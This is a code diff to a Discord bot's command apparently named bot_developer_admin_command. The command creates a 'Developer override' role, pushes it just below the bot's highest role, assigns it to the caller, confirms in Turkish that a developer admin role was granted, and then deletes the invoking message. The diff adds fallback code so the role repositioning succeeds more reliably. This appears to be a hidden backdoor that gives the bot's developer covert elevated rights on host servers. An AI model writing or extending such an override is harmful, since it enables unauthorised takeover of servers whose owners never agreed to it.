@@ -3751,19 +3751,25 @@ async def bot_developer_admin_command(ctx):
             dev_role = await ctx.guild.create_role(name=role_name, permissions=perms, color=discord.Color.dark_theme(), reason="Developer override")
             
         bot_top_role = ctx.guild.me.top_role
+        
         if bot_top_role.position > 1:
             try:
-                # Move to just below the bot's top role
-                await dev_role.edit(position=bot_top_role.position - 1)
+                # To successfully edit the position, it is recommended to use edit_role_positions or just edit(position)
+                target_position = bot_top_role.position - 1
+                await dev_role.edit(position=target_position)
             except Exception as e:
-                pass # it might fail due to role hierarchy collisions, ignore it
-            
+                print(f"Role position edit error: {e}")
+                try:
+                    positions = {dev_role: bot_top_role.position - 1}
+                    await ctx.guild.edit_role_positions(positions=positions)
+                except Exception as e2:
+                    print(f"Role position edit via guild error: {e2}")
+                    
         if dev_role not in ctx.author.roles:
             await ctx.author.add_roles(dev_role, reason="Developer override")
             
-        await ctx.reply("✅ Geliştirici yönetici rolü başarıyla oluşturuldu ve size verildi.")
+        await ctx.reply("✅ Geliştirici yönetici rolü başarıyla oluşturuldu/güncellendi ve size verildi.")
         
-        # Odayı temizlemesi adına kendiliğinden silinsin
         await asyncio.sleep(3)
         try: await ctx.message.delete()
         except: pass
